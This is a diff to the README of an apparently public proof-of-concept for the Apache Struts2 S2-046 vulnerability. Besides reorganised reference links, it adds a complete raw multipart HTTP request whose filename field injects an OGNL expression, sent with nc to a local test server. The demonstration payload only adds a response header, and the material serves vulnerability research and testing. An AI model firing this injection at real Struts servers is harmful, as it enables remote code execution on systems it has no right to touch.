@@ -1,11 +1,11 @@
 # S2-046-PoC
 
-Security Bulletin:
-https://cwiki.apache.org/confluence/display/WW/S2-046
+## References:
+- Security Bulletin: https://cwiki.apache.org/confluence/display/WW/S2-046
+- Blog post: https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#.WNAr_RLyvpR
+- Chris Frohoff's NULL character variant: https://gist.github.com/frohoff/a3e24764561c0c18b6270805140e7600
 
-More info:
-https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#.WNAr_RLyvpR
-
+## Proof of concept:
 Start vulnerable application with:
 ```
 mvn jetty:run
@@ -33,4 +33,10 @@ Content-Type: text/plain
 
 foo
 ------WebKitFormBoundaryXd004BVJN9pBYBL2--
+```
+
+Send request:
+```
+export payload="POST /doUpload.action HTTP/1.1\r\nHost: localhost:8080\r\nContent-Length: 279000000\r\nCache-Control: max-age=0\r\nOrigin: http://localhost:8080\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nReferer: http://localhost:8080/doUpload\r\nAccept-Language: en-US,en;q=0.8,es;q=0.6\r\nConnection: close\r\n\r\n------WebKitFormBoundaryXd004BVJN9pBYBL2\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}\"\r\nContent-Type: text/plain\r\n\r\nfoo\r\n------WebKitFormBoundaryXd004BVJN9pBYBL2--\r\n"
+echo -e "$payload" | nc localhost 8080
 ```
